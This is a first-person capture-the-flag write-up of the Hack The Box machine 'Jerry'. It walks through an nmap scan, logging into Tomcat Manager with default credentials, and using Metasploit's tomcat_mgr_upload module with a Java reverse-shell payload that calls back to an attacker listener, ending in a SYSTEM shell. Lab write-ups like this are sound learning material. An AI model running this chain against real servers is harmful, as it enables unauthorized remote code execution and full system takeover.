# Jerry

## Recon
After giving the machine a cursory scan with nmap `nmap -sV -sC -Pn 10.10.10.95`, we can see that only one port is returning as open:
```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-open-proxy: Proxy might be redirecting requests
```

I was unfamiliar with Tomcat, but after goolging it, I found that it's a java service used to store WAR files, the purpose of which is used to distribute JAR, JavaServer Pages,  Java Servlets, Java classes, XML files, tag libraries and static web pages. Immediately I realised that if I were able to upload to this service, I could easily establish a reverse shell. After looking at common exploits/default credentials for this service, I found out that the usernames: admin, roles admin and manager were default credentials, often with no password requirements and made a note of this.

After navigating to 10.10.10.95:8080 in my web browser, I was met with the splash page for the Tomcat service. I clicked around to see what I could find. The first page that I tried to access was "Host Manager", as I thought that if this was misconfigured, it would allow me an incredible foothold. Upon trying to access it though, I was unable to login via my web browser using any of the admin names I had noted down. However, when I cancelled my attempt to login, I was taken to a page that listed suggested default login credentials:

username: tomcat
password: s3cret

I didn't think this would be useful, but took note anyway. After my first failed login attempt I navigated to Manager App. Upon clicking on it, I was asked to log in again. I used the above suggested credentials and was able to access this dashboard.

--------------------------------------------------------------------------------------------------------------------------------------------------------

## Foothold/Remote Code Execution

I noticed that this page allowed for the uploading and execution of WAR files. For my first test, I uploaded a Java one liner to a directory I created for it, however after I deployed and attempted to run it, nothing happened. I tried again, this time with a .php one liner, again no luck.

What I did know though, was that I could upload files to this website without any restrctions.

I got back onto google again and researched Tomcat vulnerabilities with the amount of access I had, and came across a Metasploit plugin for this specifically.

I armed Metasploit with the following options:
```
use exploit/multi/http/tomcat_mgr_upload
set rhosts 10.10.10.95
set rport 8080
```

After setting my tool, rhost and rport I checked the payloads that I could use
```
show payloads
   #   Name                                     Disclosure Date  Rank    Check  Description
   -   ----                                     ---------------  ----    -----  -----------
   0   payload/generic/custom                                    normal  No     Custom Payload
   1   payload/generic/shell_bind_tcp                            normal  No     Generic Command Shell, Bind TCP Inline
   2   payload/generic/shell_reverse_tcp                         normal  No     Generic Command Shell, Reverse TCP Inline
   3   payload/generic/ssh/interact                              normal  No     Interact with Established SSH Connection
   4   payload/java/jsp_shell_bind_tcp                           normal  No     Java JSP Command Shell, Bind TCP Inline
   5   payload/java/jsp_shell_reverse_tcp                        normal  No     Java JSP Command Shell, Reverse TCP Inline
   6   payload/java/meterpreter/bind_tcp                         normal  No     Java Meterpreter, Java Bind TCP Stager
   7   payload/java/meterpreter/reverse_http                     normal  No     Java Meterpreter, Java Reverse HTTP Stager
   8   payload/java/meterpreter/reverse_https                    normal  No     Java Meterpreter, Java Reverse HTTPS Stager
   9   payload/java/meterpreter/reverse_tcp                      normal  No     Java Meterpreter, Java Reverse TCP Stager
   10  payload/java/shell/bind_tcp                               normal  No     Command Shell, Java Bind TCP Stager
   11  payload/java/shell/reverse_tcp                            normal  No     Command Shell, Java Reverse TCP Stager
   12  payload/java/shell_reverse_tcp                            normal  No     Java Command Shell, Reverse TCP Inline
   13  payload/multi/meterpreter/reverse_http                    normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager
```

I feel relatively comfortable with Java reverse shells, and know that this service is based around Java, so I decided to go with the java reverse shell and to set a listening port.
```
set payload java/shell_reverse_tcp
set lhost 10.10.14.8
set lport 9998
```

After this, I just needed to plug in the login credentials that I found and to execute the payload.
```
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword s3cret
HttpPassword => s3cret
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
run
```

After getting into Tomcat via Metasploit, I ran whoami to check my account
```
C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```

From here I just snooped around directories until I found both the user and root flag in the same directory `C:\Users\Administrator\Desktop\flags`
